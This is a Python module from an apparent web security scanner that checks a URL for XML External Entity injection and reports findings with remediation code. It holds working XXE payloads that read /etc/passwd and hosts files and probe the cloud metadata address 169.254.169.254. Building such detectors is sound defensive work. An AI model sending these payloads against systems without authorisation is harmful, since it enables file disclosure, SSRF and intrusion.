"""
XXE (XML External Entity) Injection Module (v1.2.0)
Learned from: Greaper (xxe.py), Wapiti (mod_xxe.py), w4af (xxe.py)
"""
from __future__ import annotations
import re
from typing import List
from webshield.core.models import Finding, Severity
from webshield.core.http import get_client

# XXE payloads targeting common files
XXE_PAYLOADS = [
    # Linux /etc/passwd
    (
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "file:///etc/passwd", re.compile(r"root:[x*]?:0:0:")
    ),
    # Linux /etc/hosts
    (
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
        "file:///etc/hosts", re.compile(r"127\.0\.0\.1\s+localhost")
    ),
    # Windows hosts file
    (
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><root>&xxe;</root>',
        "file:///C:/Windows/...", re.compile(r"localhost|127\.0\.0\.1", re.I)
    ),
    # SSRF via XXE — internal metadata
    (
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        "http://169.254.169.254/...", re.compile(r"ami-|instance-id|local-hostname", re.I)
    ),
]

XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/xhtml+xml",
]


def scan(url: str, timeout: float = 10.0) -> List[Finding]:
    findings: List[Finding] = []

    with get_client(timeout=min(timeout, 8.0)) as client:
        # First check if site accepts XML
        try:
            probe_resp = client.post(
                url,
                content='<?xml version="1.0"?><root>test</root>',
                headers={"Content-Type": "application/xml"},
            )
            # If 415 Unsupported Media Type — XML not accepted
            if probe_resp.status_code == 415:
                return []
        except Exception:
            return []

        for (payload, target, success_pattern) in XXE_PAYLOADS:
            for content_type in XML_CONTENT_TYPES[:2]:
                try:
                    resp = client.post(
                        url,
                        content=payload,
                        headers={"Content-Type": content_type},
                    )
                    body = resp.text

                    if success_pattern.search(body):
                        findings.append(Finding(
                            title="XXE (XML External Entity) Injection",
                            severity=Severity.CRITICAL,
                            description=(
                                "The application is vulnerable to XML External Entity injection. "
                                f"An XXE payload targeting '{target}' returned file contents. "
                                "Attackers can read any file on the server (source code, configs, "
                                "SSH keys, /etc/passwd), perform SSRF to internal services, "
                                "and in some cases achieve remote code execution."
                            ),
                            evidence=(
                                f"Endpoint: {url}\n"
                                f"Content-Type: {content_type}\n"
                                f"Target: {target}\n"
                                f"Response snippet: {body[:200]}"
                            ),
                            remediation=(
                                "Disable external entity processing in your XML parser. "
                                "This is the ONLY reliable fix — input validation is not sufficient."
                            ),
                            code_fix=(
                                "# Python (lxml):\n"
                                "from lxml import etree\n"
                                "parser = etree.XMLParser(\n"
                                "    resolve_entities=False,\n"
                                "    no_network=True,\n"
                                "    load_dtd=False,\n"
                                ")\n"
                                "tree = etree.parse(xml_input, parser)\n\n"
                                "# Python (defusedxml — simplest fix):\n"
                                "import defusedxml.ElementTree as ET\n"
                                "tree = ET.parse(xml_input)  # safe by default\n\n"
                                "# Java:\n"
                                "factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n"
                                "factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\n"
                                "factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\");"
                            ),
                            reference="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                            cvss=9.8,
                        ))
                        return findings
                except Exception:
                    continue

    return findings
